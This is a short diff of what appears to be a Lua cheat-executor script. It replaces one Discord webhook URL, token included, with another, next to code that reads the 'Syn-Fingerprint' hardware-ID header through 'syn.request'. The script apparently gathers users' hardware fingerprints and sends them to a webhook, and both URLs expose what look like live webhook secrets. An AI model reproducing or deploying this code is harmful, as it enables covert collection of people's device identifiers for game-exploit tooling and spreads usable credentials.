@@ -1,4 +1,4 @@
-local url = 'https://discord.com/api/webhooks/846199568291069972/2et29Hyk_PkjI9s3BEFNFP3fM-0-ihX1Qo2DnGKDoJ87V99BVMQWNOB9Q_auUjK1RkTf'
+local url = 'https://discord.com/api/webhooks/853518088526626866/PTXcUPM46EAzngycOd2CS4arczSvKGpQTAZIpO0UgAMZh3sdUNoRm8iPs_vwdabc7jY4'
 local req = syn.request
 local hwid_headers = {'Syn-Fingerprint'} -- You will have to add more headers for different exploits
 
